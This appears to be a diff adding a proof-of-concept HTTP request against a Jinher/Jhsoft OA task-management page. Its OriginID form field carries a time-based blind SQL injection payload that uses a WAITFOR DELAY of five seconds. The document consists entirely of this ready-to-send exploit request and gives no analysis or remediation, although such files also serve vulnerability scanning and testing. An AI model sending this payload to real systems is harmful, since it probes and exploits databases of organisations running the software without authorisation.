@@ -1,0 +1,5 @@
+POST /c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx/ HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+
+_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=xxxxx&__VIEWSTATEGENERATOR=09BBB40C&__EVENTTARGET=&__EVENTARGUMENT=&OriginModule=crmexec&OriginID='WAitFor+DelaY'0:0:5'--
